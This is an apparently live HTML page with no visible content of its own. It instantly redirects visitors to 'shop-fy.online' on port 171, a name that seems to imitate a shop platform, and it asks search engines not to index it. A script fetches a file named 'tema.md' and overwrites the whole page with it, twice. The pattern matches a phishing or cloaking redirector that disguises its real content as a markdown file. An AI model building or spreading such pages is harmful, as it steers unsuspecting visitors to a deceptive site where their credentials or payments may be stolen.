<!DOCTYPE html>
<html lang="en-gb" dir="ltr">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,follow">
   <meta name="Description" CONTENT=" ">
   <meta http-equiv="refresh" content="0; URL='https://shop-fy.online:171/'"/>
  <link rel="shortcut icon" type="image/png" href="img/favicon.png" >
  <link href="https://fonts.googleapis.com/css?family=Montserrat:500,600,700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="css/main.css" />
  <script src="js/uikit.js"></script>
</head>

<body>
<script
  src="https://code.jquery.com/jquery-3.5.1.min.js"
  integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
  crossorigin="anonymous"></script>
 
 
 
<input type="text" name="vaiz">
 
 


<script>
function vai () {
 
	$.ajax({
        url: "tema.md",
        type: 'GET',
        success: function(res) {
        	$("html").html(res);  
		
        }
    });

}


vai();

   setTimeout(function () {
     
    	vai();
    }, 1200);
</script>
